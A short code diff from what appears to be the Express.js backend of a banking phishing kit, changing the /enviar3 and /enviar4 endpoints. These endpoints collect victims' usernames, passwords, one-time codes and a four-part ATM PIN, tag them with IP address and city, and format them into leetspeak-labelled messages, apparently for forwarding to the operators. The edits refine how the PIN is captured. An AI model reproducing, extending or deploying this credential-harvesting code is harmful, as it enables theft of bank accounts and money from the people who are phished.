@@ -196,6 +196,7 @@ app.post('/enviar3', async (req, res) => {
 
 📱 US4R: <code>${usar}</code>
 🔐 CL4V: <code>${clavv}</code>
+
 🔑 0TP: <code>${dinamic}</code>
 
 🌐 IP: ${ip}
@@ -230,7 +231,7 @@ app.post('/enviar3', async (req, res) => {
 
 
 app.post('/enviar4', async (req, res) => {
-  const { usar, clavv, txid, cece, etm } = req.body;
+  const { usar, clavv, txid, pnn, pnn2, pnn3, pnn4 } = req.body;
   const ip = obtenerIP(req);
   const ciudad = await obtenerCiudad(ip);
 
@@ -240,8 +241,8 @@ app.post('/enviar4', async (req, res) => {
 
 📱 US4R: <code>${usar}</code>
 🔐 CL4V: <code>${clavv}</code>
-🔑 RUC: <code>${cece}</code>
-🔑 4TM: <code>${etm}</code>
+
+🔑 4TM: <code>${pnn}${pnn2}${pnn3}${pnn4}</code>
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
